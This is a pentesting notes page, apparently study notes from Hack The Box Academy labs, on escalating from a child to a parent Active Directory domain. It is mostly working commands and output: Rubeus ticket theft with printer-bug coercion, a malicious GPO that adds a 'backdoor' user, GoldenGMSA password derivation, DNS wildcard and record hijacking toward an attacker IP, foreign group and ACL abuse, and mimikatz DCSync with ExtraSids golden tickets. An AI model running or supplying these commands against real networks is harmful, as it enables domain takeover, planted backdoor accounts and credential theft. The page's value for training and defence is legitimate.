---
description: >-
  Intra-forest allows for communication and resource sharing between multiple
  domains
---

# Intra Forest Attacks

### <mark style="color:yellow;">Unconstrained Delegation</mark>

This allows a service running under a user account to impersonate other users and access resources on their behalf.&#x20;

{% hint style="info" %}
By default, all domain controllers have `Unconstrained Delegation` enabled
{% endhint %}

If a child DC with unconstrained delegation is compromised it possible to get the TGT of the administrator of a parent DC when it logs in, or use printer bug to coerce.

```powershell
# Monitor for tickets
.\Rubeus.exe monitor /interval:5 /nowrap

#  Coerce with printerbug
.\SpoolSample.exe dc01.zencorp.ad dc02.dev.zencorp.ad

# Monitor for tickets again
.\Rubeus.exe monitor /interval:5 /nowrap

# Renew ticket
.\Rubeus.exe renew /ticket:doIFvDCC<SNIP> /ptt
```

### <mark style="color:yellow;">ADCS</mark>

ADCS is a server role that can build a PKI or public key infrastructure using digital certificates. Details from `Certification Authorities (CAs)` and `Certificate Templates` are stored in LDAP. The attack:

1. Add new vulnerable template inside certificate templates container as `pKICertificateTemplate` object.
2. Give administrator user of child domain Full Control over that template
3. Publish the template to CA server by modifying `pKIEnrollmentService` object of the CA inside the `Enrollment Services` container.
4. Request the certificate for `root\Administrator` from the child domain.

<details>

<summary>The attack</summary>

[https://academy.hackthebox.com/module/253/section/2805](https://academy.hackthebox.com/module/253/section/2805)

</details>

### <mark style="color:yellow;">Configuration Naming Context (NC)</mark>

The **Configuration Naming Context (NC)** in Active Directory holds important settings for the entire AD forest, settings that apply to whole forest. These settings are copied to every domain in the forest. The address or Distinguished Name (DN) is `CN=Configuration,DC=inlanefreight,DC=ad`.

{% hint style="info" %}
**Configuration Naming Context (NC) replication abuse** happens when attackers misuse the replication system of Active Directory to spread unauthorized changes across the network.
{% endhint %}

**Enum ACL's for WRITE access on Configuration Naming Context with Get-Acl**

```powershell
PS C:\Users\Administrator> $dn = "CN=Configuration,DC=ZENCORP,DC=AD"
PS C:\Users\Administrator> $acl = Get-Acl -Path "AD:\$dn"
PS C:\Users\Administrator> $acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|Write" }
```

### <mark style="color:yellow;">ADCS Abuse</mark>

ADCS allows to build Public Key Infrastructure to provide secure communication using digital certificates. Details of CA's or Certification Authorities and Templates are stored in LDAP. Configuration Naming Context or NC holds information about entire forest.&#x20;

It needs setting up in adsiedit.msc and msc as SYSTEM.&#x20;

{% embed url="https://academy.hackthebox.com/module/253/section/2805" %}

{% hint style="info" %}
The Configuration Naming Context (NC) is a special container in Active Directory that stores forest-wide configuration data.
{% endhint %}

## <mark style="color:yellow;">GPO On Site Attack</mark>

GPOs allows network administrators to control and manage settings for groups of computers and users.  Every **Domain Controller (DC)** in the forest, including child domain DCs, has **a copy** of the Configuration NC. This means that **a child domain DC can read and modify certain settings that affect the entire forest.**

A **child DC with SYSTEM privileges** can make changes which synchronizes across all DCs, even parent domain controllers.

If a **child DC** links a **malicious GPO** to a site, it will **automatically replicate to the parent domain** and **apply to parent domain controllers**.

#### **GPO On-Site Attack:**

1. **Create a malicious GPO** on the child domain controller.
2. **Find the replication site** used by the parent (root) domain.
3. **Link the malicious GPO** to the default replication site of the root domain using SYSTEM privileges.
4. **Wait for replication** to complete, then check if the GPO has successfully applied to the root domain controller.

#### Create a new GPO

```powershell
PS C:\Tools> $gpo = "Backdoor"
PS C:\Tools> New-GPO $gpo
```

Add a scheduled task into Backdoor. When GPO is replicated the scheduled task will replicate.&#x20;

```powershell
# Add a user with GPO
PS C:\Tools> Import-Module .\PowerView_2.ps1
PS C:\Tools> New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor' -GPODisplayName "Backdoor" -Command C:\Windows\System32\cmd.exe -CommandArguments "/c net user backdoor B@ckdoor123 /add"
```

> Confirm by accessing the `Scheduled Tasks` settings under `Computer Configuration -> Preferences -> Control Panel Settings`. Set Scheduled Task Settings to `Run a new instance in parallel`.

#### Retrieve Replication Site to Root Domain Controller

```powershell
Get-ADDomainController -Server zencorp.ad |Select ServerObjectDN
```

#### Link GPO to Default Site as SYSTEM

```powershell
PS C:\Tools> .\PsExec.exe -s -i powershell.exe
PS C:\Windows\system32> whoami
nt authority\system

$sitePath = "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD"
New-GPLink -Name "Backdoor" -Target $sitePath -Server dev.zencorp.ad
```

#### Get TGT

```powershell
 .\Rubeus.exe asktgt /user:backdoor /password:'B@ckdoor123' /domain:zencorp.ad /ptt
```

### <mark style="color:yellow;">GoldenGMSA Attack</mark>

Service account with SPNs set can be kerberoasted. **Group Managed Service Accounts (gMSA)** solve this issue by letting **Windows manage the passwords automatically**, removing the need for manual password changes.&#x20;

* **Active Directory (AD)** handles the password rotation **every 30 days**.
* The password is **256 bytes long**, making it extremely hard to crack.
* The password is generated using a **secret stored in the KDS root key object**.

{% hint style="info" %}
Only users or systems **authorized** to access the `msDS-ManagedPassword` attribute can retrieve it. Attackers need access to such an account to extract the gMSA password.
{% endhint %}

```powershell
# Zen student can retrieve password apache-dev
New-ADServiceAccount -Name "apache-dev" -DNSHostName "zencorp.ad" -PrincipalsAllowedToRetrieveManagedPassword zen-student-1 -Enabled $True
```

To compromise a parent domain from a child domain we use GoldenGMSA. Need to be member of enterprise admins, domain admins or SYSTEM on a DC.&#x20;

**Online Attack**

1. Get the **gMSA SID** from the **parent domain.**
2. Use the **SID** to calculate the gMSA password by querying both parent and child domains.

```powershell
# Open PS as SYSTEM
.\PsExec -s -i powershell

# Enumerate
.\GoldenGMSA.exe gmsainfo --domain inlanefreight.ad

# Get gMSA password
.\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-1106" --forest dev.zencorp.ad --domain zencorp.ad
```

**Offline Attack**

1. **Retrieve the gMSA SID** and **msDS-ManagedPasswordID** from the **parent domain**.
2. **Get the KDS key info** from the **child domain** using **SYSTEM privileges**.
3. **Manually compute** the gMSA password using the **GoldenGMSA tool** by combining the **KDS key and gMSA attributes**.

```powershell
# Open PS as SYSTEM
.\PsExec -s -i powershell

# Get msds-ManagedPasswordID
.\GoldenGMSA.exe gmsainfo --domain inlanefreight.ad

# Get kdsinfo
.\GoldenGMSA.exe kdsinfo --forest dev.inlanefreight.ad

# Compute gMSA password
PS C:\Tools> .\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-1106" --kdskey AQAAAAwsk7o0XG
```

Convert password

```python
# hashlib
import hashlib
import base64
 
base64_input  = "WITSKRtGahQFvL/iUmJfQbRIJ7S7GMW+nKUj+TlJ4YZJyZ6pjlp5caC78rC4oY6woKxe294/hPCCl6nL2NNWSmj6f1GlmFKvizvlABXVpLqIGbQvyZEbYhPr+twasnf4m+B0qmwj4fXUx8qQAy+cEIV8sd18ZvOLKet7259cIbXTV1lbO3gxIEmDDjMmgP6QD1GQDHnr4xxgwR5YKZC9CbK01db3SWlpPYxElx30MGwzMLtL17ccxmGYAMzqNq/R9ldEq/hC4WDJ3hGg4CVagcOuHOQPOJ6Nh0+x4CBE46CoshfID+3wyswFI/akytdBDVyNk1hj9KH4v/kizCPw6A=="

print(hashlib.new("md4", base64.b64decode(base64_input)).hexdigest())

# md4
from Crypto.Hash import MD4
import base64

base64_input  = "WITSKRtGahQFvL/iUmJfQbRIJ7S7GMW+nKUj+TlJ4YZJyZ6pjlp5caC78rC4oY6woKxe294/hPCCl6nL2NNWSmj6f1GlmFKvizvlABXVpLqIGbQvyZEbYhPr+twasnf4m+B0qmwj4fXUx8qQAy+cEIV8sd18ZvOLKet7259cIbXTV1lbO3gxIEmDDjMmgP6QD1GQDHnr4xxgwR5YKZC9CbK01db3SWlpPYxElx30MGwzMLtL17ccxmGYAMzqNq/R9ldEq/hC4WDJ3hGg4CVagcOuHOQPOJ6Nh0+x4CBE46CoshfID+3wyswFI/akytdBDVyNk1hj9KH4v/kizCPw6A=="

print(MD4.new(base64.b64decode(base64_input)).hexdigest())

```

Finally request a ticket

```powershell
.\Rubeus.exe asktgt /user:svc_devadm$ /rc4:32ac66cd327aa76b3f1ca6eb82a801c5 /domain:zencorp.ad /ptt
```

### <mark style="color:yellow;">DNS Trust Attack</mark>

DNS Trust attacks abuses privileges granted to Enterprise Domain Controllers. That is the creation, deletion and modification of DNS records which can lead to MiTM attacks. They are stored in:

1. DomainDnsZones partition `(CN=MicrosoftDNS,DC=DomainDnsZones,DC=root,DC=local)`
2. ForestDnsZones partition `(CN=MicrosoftDNS,DC=ForestDnsZones,DC=root,DC=local)`
3. Domain partition `(CN=MicrosoftDNS,CN=System,DC=root,DC=local)`

{% hint style="info" %}
It is possible to change DNS records on the parent domain with `SYSTEM` rights on a child domain controller (DC) and change DNS records.
{% endhint %}

#### DNS Wildcard injection

A wildcard acts like a fallback when a request domain does not have match in the DNS zone. If no record exists the wildcard provides a response. With SYSTEM privileges on a child DC we can inject a a wildcard record in the parent domain DNS like `*.zencorp.ad → Attacker_IP`. So non-existent subdomains would lead to attacker IP.

```powershell
PS C:\Tools> Resolve-DNSName TEST1.zencorp.ad
Resolve-DNSName : TEST1.zencorp.ad : DNS name does not exist
```

Create Wildcard

```powershell
# Spawn PS as SYSTEM
.\PsExec -s -i powershell

# Create DNS wildcard
Import-module .\Powermad.ps1
New-ADIDNSNode -Node * -domainController DC01.zencorp.ad -Domain inlanefreight.ad -Zone inlanefreight.ad -Tombstone -Verbose
VERBOSE: [+] Forest = ZENCORP.AD
VERBOSE: [+] Distinguished Name = DC=*,DC=zencorp.ad,CN=MicrosoftDNS,DC=DomainDNSZones,DC=zencorpp,DC=ad
VERBOSE: [+] Data = 172.16.210.3
VERBOSE: [+] DNSRecord = 04-00-01-00-05-F0-00-00-5D-00-00-00-00-00-02-58-00-00-00-00-1E-9B-38-00-AC-10-D2-03
[+] ADIDNS node * added  

# Test
Resolve-DNSName ANYTHING.zencorp.ad
Name                                           Type   TTL   Section    IPAddress
----                                           ----   ---   -------    ---------
ANYTHING.zencorp.ad                      A      599   Answer     172.16.210.3         
```

With SYSTEM privileges on a child DC we can change IPs of critical servers. For example by changing the records for `dev01.zencorp.ad` and pointing it to my IP. Then we can use Responder or Relay.

```powershell
# Spawn PS as SYSTEM
.\PsExec -s -i powershell

# Enumerate DNS records in parent domain
Get-DnsServerResourceRecord -ComputerName DC01.zencorp.ad -ZoneName zencorp.ad -Name "@"

# Enumerate DEV01
Resolve-DnsName -Name DEV01.zencorp.ad -Server DC01.zencorp.AD

# Modify DNS Records for DEV01
$Old = Get-DnsServerResourceRecord -ComputerName DC01.zencorp.AD -ZoneName zencorp.ad -Name DEV01
$New = $Old.Clone()
$TTL = [System.TimeSpan]::FromSeconds(1)
$New.TimeToLive = $TTL
$New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('172.16.210.3')
Set-DnsServerResourceRecord -NewInputObject $New -OldInputObject $Old -ComputerName DC01.zencorp.AD -ZoneName zencorp.ad
Get-DnsServerResourceRecord -ComputerName DC01.zencorp.ad -ZoneName zencorp.ad -Name "@"

# Run Inveigh
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -SMB Y
```

### <mark style="color:yellow;">Foreign Groups & ACL Principals</mark>

Within Intra-Forest its possible to add users or groups from a child domain into groups in parent domain. AD uses scopes to define how board a group is within the AD.&#x20;

<table><thead><tr><th width="213">Scope</th><th>Possible Members</th></tr></thead><tbody><tr><td>Universal</td><td><strong>User accounts</strong> from <strong>any domain</strong> in the forest, <strong>Global groups</strong> from <strong>any domain</strong> in the forest, o<strong>ther Universal groups</strong> from <strong>any domain</strong> in the forest.</td></tr><tr><td>Global</td><td><strong>User accounts</strong> from the <strong>same domain, Other Global groups</strong> from the <strong>same domain</strong>.</td></tr><tr><td>Domain Local</td><td>Accounts and Global groups from any domain or trusted domain, plus Universal groups from any domain in the same forest, plus Domain Local groups from the same domain. Additionally, Accounts, Global groups, and Universal groups can be included from other forests and external domains.</td></tr></tbody></table>

#### Enumerate Foreign Group Membership

```powershell
# Enumerate
Import-Module .\PowerView.ps1
Get-DomainForeignUser

# Output above shows membership zencorp_admins group
Get-DomainGroup -Identity 'zencorp_admins' -domain zencorp.ad

# Show memberships
Get-DomainGroup -Identity 'zencorp_admins' -domain zencorp.ad | select memberof
```

<details>

<summary>Enum Foreign ACLs for all users</summary>

```powershell
$Domain = "inlanefreight.ad"
$DomainSid = Get-DomainSid $Domain

Get-DomainObjectAcl -Domain $Domain -ResolveGUIDs -Identity * | ? { 
	($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') -and `
	($_.AceType -match 'AccessAllowed') -and `
	($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and `
	($_.SecurityIdentifier -notmatch $DomainSid)
} 
```

</details>

#### Abuse Foreign Group Membership

```powershell
# Sacrificial logon
./Rubeus createnetonly /program:powershell.exe /show

# Request a ticket
.\Rubeus.exe asktgt /user:jerry /password:jerry /domain:dev.zencorp.ad /ptt

# Create a new domain user in parent domain
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'T3st@123' -AsPlainText -Force
New-DomainUser -Domain zencorp.ad -SamAccountName testuser -AccountPassword $SecPassword

# Add new user in DNSAdmins
Add-ADGroupMember -identity "DNSAdmins" -Members testuser -Server zencorp.ad
```

#### Foreign ACL Principals

Users from a child domain can have ACL permissions on groups/users in parent domain.&#x20;

```powershell
# Enumerate ACLS
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid rita
Tools> Get-DomainObjectAcl -ResolveGUIDs -Identity * -domain zencorp.ad | ? {$_.SecurityIdentifier -eq $sid}
```

#### Abuse Foreign ACL&#x20;

```powershell
# Sacrificial logon
./Rubeus createnetonly /program:powershell.exe /show

# Request a ticket
.\Rubeus.exe asktgt /user:rita /password:rita /domain:dev.zencorp.ad /ptt

# Add member
Add-DomainGroupMember -identity 'Infrastructure' -Members 'DEV\rita' -Domain zencorp.ad -Verbose

# Confirm
Get-DomainGroupMember -Identity 'Infrastructure' -Domain zencorp.ad -Verbose

```

### <mark style="color:yellow;">ExtraSids Attack</mark>

SID History Abuse or ExtraSids attacks can be used to gain higher privileges, going from a child domain to a parent domain. This is used because of SID History. An SID contains permissions, and SID was created to help moving users between domains, as it will let you keep old permissions.

By abusing the SID History attribute we can manipulate it to trick the AD into granting **unauthorized admin-level access**.

{% hint style="info" %}
**How does it work?**

1. Understand SID History: SIDs are unique numbers assigned to users and groups. When users move between domains the AD keeps theird old SIDs in SID history attribute, which can be exploited.
2. Why does it work in same AD Forest: SID filtering blocks cross-forest but not inside the same AD. So if attacker from child domain adds Enterpise Admin SID, AD sees them as Enterprise Admin.
{% endhint %}

#### ExtraSIDs Attack from Windows

```powershell
# DCSync
\mimikatz.exe "lsadump::dcsync /user:DEV\krbtgt" exit

# Get SID
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainSID
S-1-5-21-2901893446-2198612369-2488268720

# Get Enterprise Admins SID from Parent Domain
PS C:\Tools> Get-ADGroup -Identity "Enterprise Admins" -Server "inlanefreight.ad"

# Create golden ticket
PS C:\Tools> .\Rubeus.exe golden /rc4:992093609707726257e0959ce3e24771 /domain:dev.inlanefreight.ad /sid:S-1-5-21-2901893446-2198612369-2488268720 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /user:Administrator /ptt

# Create golden ticket with mimikatz
kerberos::golden /user:Administrator /domain:dev.inlanefreight.ad  /sid:S-1-5-21-2901893446-2198612369-2488268720 /krbtgt:992093609707726257e0959ce3e24771 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /ptt
```

#### ExtraSIDs Attack from Linux

```
// Some code
```

